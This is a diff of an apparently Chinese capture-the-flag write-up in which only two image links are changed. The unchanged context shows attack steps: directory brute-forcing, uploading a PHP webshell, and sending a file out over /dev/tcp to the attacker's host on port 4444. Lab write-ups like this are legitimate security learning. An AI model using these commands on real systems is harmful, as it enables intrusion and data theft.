@@ -52,7 +52,7 @@ gobuster dir -u http://192.168.205.187/ -w /usr/share/wordlists/seclists/Discove
 *   访问 `http://192.168.205.187/index.php` 确认是一个文件上传表单。
 *   尝试上传一个PHP Webshell (`shell.php`)。
 
-![文件上传页面截图](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250412184148968.png)
+![文件上传页面截图](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250412184148968.png)
 
 上传后发现文件出现在 `/upload/` 目录下，但文件名被修改为 `shell.php.dsz`，无法直接执行。同时观察到 `/tmp/` 目录没有文件常驻。
 
@@ -236,7 +236,7 @@ www-data@7r1umph:/opt$ cat yeyeye.png > /dev/tcp/192.168.205.128/4444
 
 在Kali上查看图片 `yeyeye.png`:
 
-![Dorabella Cipher 图片](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250412190141508.png)
+![Dorabella Cipher 图片](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250412190141508.png)
 
 通过图片内容和网络搜索 (Google识图等)，可以识别出这是一种名为 **Dorabella Cipher** 的密码。
 
